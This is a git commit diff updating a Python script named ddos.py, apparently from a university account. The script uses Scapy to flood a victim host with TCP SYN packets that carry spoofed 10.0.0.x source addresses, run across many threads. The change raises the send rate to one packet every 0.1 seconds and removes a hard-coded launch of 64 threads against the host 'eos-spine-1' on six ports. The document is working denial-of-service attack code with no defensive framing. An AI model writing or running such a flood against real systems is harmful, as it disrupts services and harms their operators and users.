d47b1051c6a88ff747f643ebab17a8bb5e8244ce
mark-wilmes <mawi0949@colorado.edu>
2017-10-14 16:26:37 -0400

    Update ddos.py

--- ddos.py
+++ ddos.py
@@ -5,16 +5,12 @@ import time
 def sendPackets(victimAddress,victimPort):
 	for i in range(1,254):
 		for port in victimPort:
-			cSYN=IP(dst=sys.argv[1],id=1111,ttl=99)/TCP(sport=RandShort(),dport=[22,80],seq=12345,ack=1000,window=1000,flags="S")/"HaX0r SVP"
+			packetSYN=IP(src="10.0.0." + str(i), dst=victimAddress,id=1111,ttl=99)/TCP(sport=RandShort(),dport=victimPort,seq=12345,ack=1000,window=1000,flags="S")/"HaX0r SVP"
 			print "Sending Packets in 1 second intervals for timeout of 4 sec"
-			ans,unans=srloop(packetSYN,inter=1,retry=2,timeout=4)
+			ans,unans=srloop(packetSYN,inter=0.1,retry=2,timeout=4)
 
 
 def startDDOS(victimAddress,victimPort,numThreads):
 	for i in range(1,numThreads):
 		thread = Thread(target=sendPackets,args=(victimAddress,victimPort))
-		thread.start()
-			
-
-ports = ["22","80","8080","3333","1234","443"]
-startDDOS("eos-spine-1",ports,64)	
+		thread.start()	
